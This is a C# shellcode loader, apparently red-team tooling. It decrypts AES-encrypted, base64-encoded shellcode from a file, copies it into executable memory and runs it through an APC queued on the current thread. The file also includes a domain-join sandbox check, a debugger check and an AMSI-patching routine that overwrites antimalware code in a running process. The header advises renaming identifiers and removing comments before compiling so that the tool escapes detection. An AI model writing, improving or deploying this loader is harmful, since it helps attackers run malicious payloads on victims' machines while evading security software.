/* Important notes: 
- This version is voluntary not obfuscated. 
- Namespace/Class/function/variable names should be changed and all comments and console output messages must be deleted or modified before compiling this file.
*/
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Security;
using System.Security.Cryptography;
using System.IO;

namespace CsharpShellCodeLoader
{

    class Program
    {
		
	  [DllImport("ntdll.dll")]
	   public static extern NTSTATUS NtTestAlert();

	  [DllImport("kernel32.dll")]
	   public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType,  AllocationProtect flProtect);

	  [DllImport("kernel32.dll")]
	   public static extern IntPtr GetCurrentThread();

	  [DllImport("kernel32.dll", SetLastError = true)]
	   public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);
	   
	   public enum NTSTATUS : uint {
            Success = 0,
            Informational = 0x40000000,
            Error = 0xc0000000
        }

	   public enum AllocationProtect : uint {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

	   // Basic SandBox evasion checks
	   public static void BasicSandBoxEvasion(string MyDomainName)
      {
			  // Defense evasion: Exit the program if it is running on a Windows computer that is not joined to a specific domain that you will input as an argument
        if (string.Equals(MyDomainName, System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase))
        {
				   Console.WriteLine("Domain name check is Ok -> " + System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName);
         }
        else {
				    return;
			   }
        // Defense evasion: Exit the program if a debugger is attached
        if (System.Diagnostics.Debugger.IsAttached)
			  {
				return;
        }
      }

	   // Decrypting the AES encrypted shellcode 
	   public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passkeyBytes)
     {
			byte[] decryptedBytes = null;
			byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

			using (MemoryStream ms = new MemoryStream())
			{
				using (RijndaelManaged AES = new RijndaelManaged())
				{
					AES.KeySize = 256;
					AES.BlockSize = 128;

					var key = new Rfc2898DeriveBytes(passkeyBytes, saltBytes, 1000);
					AES.Key = key.GetBytes(AES.KeySize / 8);
					AES.IV = key.GetBytes(AES.BlockSize / 8);

					AES.Mode = CipherMode.CBC;

					using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
						cs.Close();
					}
					decryptedBytes = ms.ToArray();
				}
			}
			return decryptedBytes;
		 }
		
		// Begining A-M-S-I patching code - Taken and on slightly modified from the S-H-A-R-P-K-I-L-L-E-R GitHub project
		public class AMSIPatcher
		{
			[DllImport("kernel32.dll")]
			static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

			[DllImport("kernel32.dll", SetLastError = true)]
			static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

			[DllImport("kernel32.dll")]
			static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);

			[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
			static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
			internal static extern IntPtr LoadLibrary(string lpFileName);

			[DllImport("kernel32.dll", SetLastError = true)]
			static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);

			[DllImport("kernel32.dll")]
			static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

			[DllImport("kernel32.dll")]
			static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

			[DllImport("kernel32.dll", SetLastError = true)]
			static extern bool CloseHandle(IntPtr hObject);

			static List<int> alreadyPatched = new List<int>();

			[StructLayout(LayoutKind.Sequential)]
			struct PROCESSENTRY32
			{
				public uint dwSize;
				public uint cntUsage;
				public uint th32ProcessID;
				public IntPtr th32DefaultHeapID;
				public uint th32ModuleID;
				public uint cntThreads;
				public uint th32ParentProcessID;
				public int pcPriClassBase;
				public uint dwFlags;
				[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
				public string szExeFile;
			};

			[Flags]
			enum SnapshotFlags : uint
			{
				HeapList = 0x00000001,
				Process = 0x00000002,
				Thread = 0x00000004,
				Module = 0x00000008,
				Module32 = 0x00000010,
				Inherit = 0x80000000,
				All = 0x0000001F
			}

			private enum State
			{
				MEM_COMMIT = 0x00001000,
				MEM_RESERVE = 0x00002000
			}

			private enum Process_access
			{
				PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
				PROCESS_CREATE_THREAD = 0x0002,
				PROCESS_QUERY_INFORMATION = 0x0400,
				PROCESS_VM_OPERATION = 0x0008,
				PROCESS_VM_READ = 0x0010,
				PROCESS_VM_WRITE = 0x0020
			}

			private const UInt32 INVALID_HANDLE_VALUE = 0xffffffff;

			private byte[] patch = new byte[1] { 0xEB };

			private int SearchPattern(byte[] startAddress, Int64 searchSize, List<object> pattern, Int64 patternSize)
			{
				int i = 0;

				while (i < 1024)
				{

					if (startAddress[i].ToString().Equals(pattern[0].ToString()))
					{
						int j = 1;
						while (j < patternSize && i + j < searchSize && (pattern[j].ToString().Equals("?") || startAddress[i + j].ToString().Equals(pattern[j].ToString())))
							j++;
						if (j == patternSize)
							return i + 3;
					}
					i++;
				}
				return i;
			}

			// AMSI patching of a target process (input = the process ID of the loader).
			private int PatchAmsi(int tpid)
			{
				List<object> pattern = new List<object>() { 0x48, '?', '?', 0x74, '?', 0x48, '?', '?', 0x74 };

				int patternSize = pattern.Count;
				if (tpid == 0)
					return -1;

				IntPtr ProcessHandle = OpenProcess((Int32)Process_access.PROCESS_VM_OPERATION | (Int32)Process_access.PROCESS_VM_READ | (Int32)Process_access.PROCESS_VM_WRITE, false, (UInt32)tpid);
				if (ProcessHandle == null)
					return -1;

				IntPtr hm = LoadLibrary("amsi.dll");
				if (hm == null)
					return -1;

				IntPtr AmsiAddr = GetProcAddress(hm, "AmsiOpenSession");
				if (AmsiAddr == null)
					return -1;

				byte[] buff = new byte[1024];
				IntPtr ReadPm = IntPtr.Zero;
				if (!ReadProcessMemory(ProcessHandle, AmsiAddr, buff, 1024, out ReadPm))
					return -1;

				int matchAddress = SearchPattern(buff, buff.Length, pattern, patternSize);
				AmsiAddr += matchAddress;
				int byteswritten = 0;

				if (!WriteProcessMemory(ProcessHandle, AmsiAddr, patch, 1, ref byteswritten))
					return -1;
				return 0;
			}
		
			// Iterates through running processes, patches AMSI when the loader process is found, and tracks the result.
			public void PatchLoaderProcess()
			{

				int procId = 0;
				int result = 0;
				string processName = "loader.exe";

				IntPtr hSnap = CreateToolhelp32Snapshot(SnapshotFlags.Process, 0);

				if ((UInt32)hSnap != INVALID_HANDLE_VALUE)
				{
					PROCESSENTRY32 entry = new PROCESSENTRY32();

					entry.dwSize = (uint)Marshal.SizeOf(entry);

					if (Process32First(hSnap, ref entry))
					{
						if (entry.th32ProcessID == 0)
						{
							Process32Next(hSnap, ref entry);
							do
							{
								if (entry.szExeFile.Equals(processName))
								{
									procId = (int)entry.th32ProcessID;

									if (result == PatchAmsi(procId) && !alreadyPatched.Contains(procId))
									{
										Console.WriteLine("[+] AMSI Patched: " + entry.th32ProcessID);
										alreadyPatched.Add(procId);
									}
									else if (result == -1)
									{
										Console.WriteLine(entry.th32ProcessID);
										Console.WriteLine("Result: " + result);
										Console.WriteLine("[-] Patch Failed");
									}
								}
							} while (Process32Next(hSnap, ref entry));
						}
					}
					CloseHandle(hSnap);
					return;
				  }
			 }
		}
			static void Main(string[] args)
        {
			    // Exit if no argument and do not provide information except "Missing arguments".
			    if (args.Length < 1)
			    {
			    	Console.WriteLine("Missing arguments.");
			    	Environment.Exit(0);
			    }
			
			    // The first argument is the joined domain name of the target Windows machine (input for the sandbox evasion check)
			    string CheckMyDomainName = args[0];
			    BasicSandBoxEvasion(CheckMyDomainName);
			
			    // The second argument is the (process) name of the loader (e.g., "loader")
			    string loaderprocessname = args[1];
			    AMSIPatcher amsiPatcher = new AMSIPatcher();
			    Process[] processes = Process.GetProcessesByName(loaderprocessname);
            if (processes.Length > 0)
            amsiPatcher.PatchLoaderProcess();
			
			    // The third argument is the path to the file containing your AES-256 encrypted shellcode encoded in base 64 (i.e., C:\path\file.txt or .\path\file.txt)
			    string encodedfilepath = args[2];
			    string encodedfile = File.ReadAllText(encodedfilepath);
			    byte[] aesencryptedshellcode = Convert.FromBase64String(encodedfile);
			
			    // The fourth argument is the AES cypher passkey 
			    string passkey = args[3];
			    byte[] passkeyBytes = Encoding.UTF8.GetBytes(passkey);
			    passkeyBytes = SHA256.Create().ComputeHash(passkeyBytes);
			
			    byte[] buffer = AES_Decrypt(aesencryptedshellcode, passkeyBytes);

			    IntPtr funcAddr = VirtualAlloc(0, (UInt32)buffer.Length, 0x1000, AllocationProtect.PAGE_EXECUTE_READWRITE);
			    Marshal.Copy(buffer, 0, (IntPtr)(funcAddr), buffer.Length);
			    IntPtr CurrentThread_hanlde = GetCurrentThread();
			    QueueUserAPC(funcAddr, CurrentThread_hanlde, 0);
			    NtTestAlert();
        }
    }
}
